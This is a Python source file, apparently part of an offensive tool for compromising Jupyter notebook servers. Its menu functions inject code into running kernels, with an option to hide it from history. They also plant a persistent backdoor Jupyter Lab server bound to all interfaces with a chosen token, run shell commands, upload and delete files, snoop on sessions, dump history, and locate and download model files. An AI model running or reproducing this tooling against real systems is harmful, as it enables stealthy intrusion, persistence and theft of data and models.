import inquirer
import asyncio
from vger.attack import attack_session, run_ephemeral_terminal, snoop
import json
import base64


class Mixin:
    def pick_target(self):
        session_info = dict()
        self.sessions = self.connection.list_running_jpy_sessions()
        if len(self.sessions) == 0:
            self.connection.print_with_rule("No running notebooks to attach to")
        else:
            for s in self.sessions:
                name = self.connection.jpy_sessions[s]["name"]
                last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
                session_info[f"{name:<20} {last_active:<30}"] = s
            select_kernel = [
                inquirer.List(
                    "kernel",
                    message="Which notebook would you like to attach to?",
                    choices=session_info.keys(),
                )
            ]
            answer = inquirer.prompt(select_kernel)
            self.target = session_info[answer["kernel"]]
        return len(self.sessions)

    def inject(self):
        attack_menu = [
            inquirer.List(
                "payload",
                message="Would you like to type your payload or reference an existing .py file?",
                choices=["Type", ".py"],
            )
        ]
        answer = inquirer.prompt(attack_menu)
        if answer["payload"] == "Type":
            payload_str = inquirer.editor("What code would you like to inject?")
        else:
            payload = [
                inquirer.Path(
                    "path", "Where is the payload .py? ", path_type=inquirer.Path.FILE
                )
            ]
            answer = inquirer.prompt(payload)
            path = answer["path"].split("? ")[-1]
            with open(path, "r") as f:
                payload_str = f.read()
        silent = [
            inquirer.List(
                "choice",
                message="Would you like show up in the history and modify the execution counter?",
                choices=["Yes (Noisy)", "No (Stealthy)"],
            )
        ]
        answer = inquirer.prompt(silent)
        if "Yes" in answer["choice"]:
            silent = False
        else:
            silent = True
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            attack_session(self.connection, self.target, payload_str, silent=silent)
        )

    def jupyter_backdoor(self, port=7777, secret=""):
        loop = asyncio.get_event_loop()
        if len(secret) == 0:
            config = [
                inquirer.Text(
                    "port",
                    message="What port do you want your Jupyter Server to run on?",
                ),
                inquirer.Text(
                    "secret",
                    message="What password do you want to use for authentication?",
                ),
            ]
            config = inquirer.prompt(config)
            port = config["port"]
            secret = config["secret"]
        if self.target:
            loop.run_until_complete(
                attack_session(
                    self.connection,
                    self.target,
                    f"import os; os.system('jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &')",
                    silent=True,
                    print_out=False,
                )
            )
            self.connection.print_with_rule(f"Backdoor attempted on {port}")
        else:
            self.connection.print_with_rule("Target needed for backdoor")
            if self.pick_target():
                self.jupyter_backdoor(port=port, secret=secret)
            else:
                self.connection.print_with_rule(
                    "Attempting to spawn Jupyter from shell"
                )
                self.connection.print_with_rule("May fail due to missing dependencies")
                self.connection.print_with_rule("Verify success manually")
                launch_jupyter = f"nohup jupyter lab --ip=0.0.0.0 --port={port} --allow-root --no-browser --NotebookApp.token={secret} >/dev/null 2>/dev/null &"
                loop.run_until_complete(
                    run_ephemeral_terminal(
                        self.connection, launch_jupyter, stdout=False
                    )
                )
                self.connection.print_with_rule(f"Backdoor attempted on {port}")

    def dump_history(self):
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            attack_session(
                self.connection,
                self.target,
                f"%history",
                silent=False,
                print_out=False,
                get_hist=True,
            )
        )

    def switch_target_notebook(self):
        self.connection.list_running_jpy_sessions()
        self.pick_target()
        self.exploit_attack()

    def run_in_shell(self):
        code = [inquirer.Text("code", "What shell command would you like to run?")]
        answers = inquirer.prompt(code)
        loop = asyncio.get_event_loop()
        loop.run_until_complete(
            run_ephemeral_terminal(self.connection, answers["code"])
        )

    def list_notebooks(self):
        self.sessions = self.connection.list_running_jpy_sessions()
        if len(self.sessions) > 0:
            for s in self.connection.jpy_sessions:
                name = self.connection.jpy_sessions[s]["name"]
                last_active = f"Last Active: {self.connection.jpy_sessions[s]['kernel']['last_activity']}"
                self.connection.print_with_rule(f"{name:<20} {last_active:<30}" + "\n")
        else:
            self.connection.print_with_rule("No running notebooks")

    def list_dir(self):
        dir = [
            inquirer.Text(
                "dir",
                "What directory or file would you like to list?",
                default="/",
            )
        ]
        answers = inquirer.prompt(dir)
        results = self.connection.list_dir(answers["dir"])
        self.connection.print_with_rule(json.dumps(results), json=True)

    def upload(self):
        payload = [
            inquirer.Path(
                "path",
                "What file do you want to upload? ",
                path_type=inquirer.Path.FILE,
            )
        ]
        answer = inquirer.prompt(payload)
        file_path = answer["path"].split("? ")[-1]
        with open(file_path, "rb") as f:
            payload = f.read()
            payload = base64.b64encode(payload).decode("utf-8")
        target = [
            inquirer.Text("path", "Where do you want to place the file?", default="/")
        ]
        answer = inquirer.prompt(target)
        data = {
            "content": payload,
            "format": "base64",
            "path": answer["path"],
            "type": "file",
        }
        self.connection.print_with_rule(
            self.connection.upload(answer["path"], json.dumps(data))
        )

    def delete(self):
        target = [inquirer.Text("path", "What file do you want to delete?")]
        answer = inquirer.prompt(target)
        response = self.connection.delete(answer["path"])
        if response.status_code == 204:
            self.connection.print_with_rule(f"{answer["path"]} deleted successfully")
        else:
            self.connection.print_with_rule(f"Error deleting {answer["path"]}")

    def snoop_for(self):
        if not self.target:
            self.connection.print_with_rule("You must select a target to snoop on")
            self.pick_target()
            self.snoop_for()
        else:
            answer = [
                inquirer.Text(
                    "seconds", "How many seconds would you like to snoop for?"
                )
            ]
            answer = inquirer.prompt(answer)
            try:
                int(answer["seconds"])
            except (ValueError, KeyboardInterrupt):
                self.connection.print_with_rule("Please specify a timeout in seconds")
                self.menu()
            loop = asyncio.get_event_loop()
            with self.connection.con.status("Snooping..."):
                loop.run_until_complete(
                    snoop(self.connection, self.target, timeout=int(answer["seconds"]))
                )

    def find_models(
        self,
        path="/",
        file_extensions=[
            "pkl",
            "pickle",
            "pt",
            "pth",
            "onnx",
            "safetensors",
            "h5",
            "npy",
            "npz",
            "joblib",
            "pb",
            "protobuf",
        ],
    ):
        try:
            for file in self.connection.list_dir(path)["content"]:
                if file["type"] == "directory":
                    self.find_models(file["path"], file_extensions)
                elif (
                    file["type"] == "file"
                    and file["name"].split(".")[-1] in file_extensions
                ):
                    self.connection.print_with_rule(f"Found {file["path"]}")
                    self.model_paths.append(file["path"])
                    self.model_paths = list(set(self.model_paths))
                else:
                    pass
        except KeyError:
            pass

    def find_models_runner(self):
        file_extensions = [
            "pkl",
            "pickle",
            "pt",
            "pth",
            "onnx",
            "safetensors",
            "h5",
            "npy",
            "npz",
            "joblib",
            "pb",
            "protobuf",
        ]
        answer = [
            inquirer.Text(
                "path", "What path would you like to recursively search?", default="/"
            ),
            inquirer.Checkbox(
                "extensions",
                "What extensions would you like to search for?",
                choices=file_extensions,
            ),
        ]

        answer = inquirer.prompt(answer)
        with self.connection.con.status("Searching..."):
            self.find_models(answer["path"], answer["extensions"])

    def download_models(self):
        if len(self.model_paths) == 0:
            self.connection.print_with_rule(
                f"You need to find some models first.\nTry Enumerate -> Find Models"
            )
            self.exploit()
        else:
            answer = [
                inquirer.Path(
                    "path",
                    message="What directory would you like to download the models to?",
                    path_type=inquirer.Path.DIRECTORY,
                ),
                inquirer.Checkbox(
                    "models", "What models do you want?", choices=self.model_paths
                ),
            ]
            answer = inquirer.prompt(answer)
            path = answer["path"].split("? ")[-1]
            for model in answer["models"]:
                model_name = model.split("/")[-1]
                with open(f"{path + model_name}", "wb") as f:
                    f.write(
                        base64.b64decode(self.connection.list_dir(model)["content"])
                    )
                self.connection.print_with_rule(f"{model_name} downloaded to {path}")
